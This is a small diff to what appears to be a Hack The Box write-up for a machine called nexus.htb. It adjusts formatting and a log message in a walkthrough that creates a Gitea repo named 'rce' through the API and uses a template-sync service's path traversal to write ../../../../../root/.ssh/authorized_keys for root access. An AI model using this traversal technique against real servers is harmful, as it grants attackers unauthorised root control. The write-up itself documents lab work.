@@ -319,8 +319,7 @@ curl -X POST http://git.nexus.htb/api/v1/users/jones/tokens \
 <img src="https://i.imgur.com/W7wqpAR.png" alt="Generating the SSH key and using the Gitea API to create and template-flag the repo" />
 
 <p>We then make further API calls to create the malicious repo.</p>
-<pre><code>
-  curl -X POST http://localhost:3000/api/v1/user/repos \
+<pre><code>curl -X POST http://localhost:3000/api/v1/user/repos \
   -H "Authorization: token $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"name":"rce","private":false}'
@@ -378,7 +377,7 @@ print("Done: "+sha)</code></pre>
 
 <p>Then run <code>git push origin main</code>.</p>
 <pre><code>git push origin main</code></pre>
-<p>Since the service runs every minute, we'll wait it and then verify once we see <code>../../../../../root/.ssh/authorized_keys was synced!</code> by running <code>tail -f /var/log/template-sync.log</code>.</p>
+<p>Since the service runs every minute, we'll wait it and then verify once we see <code>synced: ../../../../../root/.ssh/authorized_keys</code> by running <code>tail -f /var/log/template-sync.log</code>.</p>
 
 <pre><code>[2026-08-16 08:38:42] Syncing template: jones/rce
 [2026-08-16 08:38:42]   synced: README.md
